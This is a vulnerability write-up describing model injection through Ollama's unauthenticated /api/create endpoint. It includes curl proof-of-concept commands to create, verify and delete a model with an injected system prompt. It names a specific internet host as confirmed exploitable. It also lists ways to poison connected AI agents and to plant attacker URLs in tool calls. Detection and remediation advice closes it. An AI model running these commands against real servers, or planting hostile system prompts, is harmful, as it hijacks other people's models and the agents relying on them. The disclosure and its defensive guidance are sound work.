# Ollama Model Injection via Unauthenticated /api/create

**Discovered:** 2026-05-01  
**Severity:** HIGH  
**Affected versions:** All Ollama versions (no auth on /api/create in any release)  
**Confirmed on:** v0.17.5, v0.21.2, v0.22.0 (live internet targets); v0.22.1 verified unpatched via release notes  
**CVE:** None assigned, coordinated disclosure initiated 2026-05-01

---

## Summary

Ollama exposes `/api/create` without authentication. Any remote actor can create a new model using an existing model as a base, injecting an arbitrary system prompt and parameters. The operation requires zero bytes downloaded to the target, it writes only a new manifest + system-prompt layer (~512 bytes) referencing existing GGUF blobs.

---

## Attack Vector

```
POST /api/create
Content-Type: application/json

{
  "model": "backdoor:latest",
  "from": "any-existing-model:latest",
  "system": "Attacker-controlled instructions",
  "parameters": {"temperature": 0.1}
}
```

Response on success:
```
{"status":"using existing layer sha256:..."}  (×N blob layers)
{"status":"creating new layer sha256:..."}    (system prompt layer)
{"status":"writing manifest"}
{"status":"success"}
```

---

## Proof of Concept

Target: `93.123.109.107:11434` (Ollama 0.17.5, confirmed exploitable)

```bash
# Inject
curl -X POST http://TARGET:11434/api/create \
  -H "Content-Type: application/json" \
  -d '{"model":"nuclide-probe:latest","from":"hexstrike-ai:latest",
       "system":"[NuClide Probe] Write-access confirmed."}'

# Verify
curl -X POST http://TARGET:11434/api/show \
  -H "Content-Type: application/json" \
  -d '{"model":"nuclide-probe:latest"}' | jq .system

# Clean
curl -X DELETE http://TARGET:11434/api/delete \
  -H "Content-Type: application/json" \
  -d '{"model":"nuclide-probe:latest"}'
```

Confirmed flow: create (200) → tags shows model → show returns injected system prompt → delete (200) → gone.

---

## Impact

| Scenario | Description |
|----------|-------------|
| **System prompt takeover** | Replace any model's instructions with attacker-controlled content |
| **Name squatting** | Register `codellama:latest` before operator installs it, client gets attacker version |
| **Existing model overwrite** | Same model name replaces operator's version, invisible to users |
| **C2 via tool calls** | System prompt instructs model to include attacker URL in tool call responses |
| **Quota hijacking** | If cloud models are installed, injected model runs on operator's cloud quota |
| **Agent poisoning** | AI agent (Claude Desktop, GPT) connecting to Ollama receives attacker instructions permanently |

---

## Detection

- `/api/tags` response: unexpected model names or modification timestamps
- `/api/show` on any model: `system` field contains unexpected content
- Ollama logs: `api_create` events from non-loopback IPs

---

## Remediation

- Enable Ollama authentication (`OLLAMA_AUTH=<token>` in newer versions)
- Bind Ollama to `127.0.0.1` only: `OLLAMA_HOST=127.0.0.1:11434`
- Firewall port 11434 from public internet (primary fix, Ollama has no built-in auth model)

---

## API Format Note

Ollama v0.6+ (new versioning scheme) uses structured fields:
```json
{"model": "name:tag", "from": "base:tag", "system": "...", "parameters": {...}}
```

Legacy `modelfile` string format (`{"name":"...","modelfile":"FROM ...\nSYSTEM ..."}`) was removed in v0.6+. The structured format is simpler and more reliable.
